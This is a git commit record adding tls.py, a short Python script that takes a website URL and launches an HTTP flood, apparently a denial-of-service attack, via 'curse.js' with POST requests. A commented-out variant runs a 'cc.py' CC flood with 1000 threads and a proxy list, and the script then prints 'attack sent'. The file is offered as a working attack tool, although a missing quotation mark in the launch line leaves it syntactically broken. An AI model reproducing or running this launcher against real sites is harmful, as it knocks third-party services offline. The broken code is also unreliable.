594d316fc67e1cfd72d5c80cb9a3bb87998286f5
baphomet-disciple <122203558+baphomet-disciple@users.noreply.github.com>
2023-03-04 20:59:24 +0530

    Create tls.py

---
+++ tls.py
@@ -0,0 +1,13 @@
+import sys
+import subprocess
+
+if len(sys.argv) < 2:
+    print("Please provide the website URL as a command line argument.")
+    sys.exit(1)
+
+website = sys.argv[1]
+print (website)
+subprocess.Popen(["timeout","120s",node", "curse.js", "POST", website, "1000", "1000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+#process = subprocess.Popen(["timeout","120s","python3", "cc.py", "-url", website, "-m", "cc", "-v", "http", "-t", "1000", "-f", "http.txt", "-b", "1", "-s", "2592000", "post"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+print("attack sent")
+
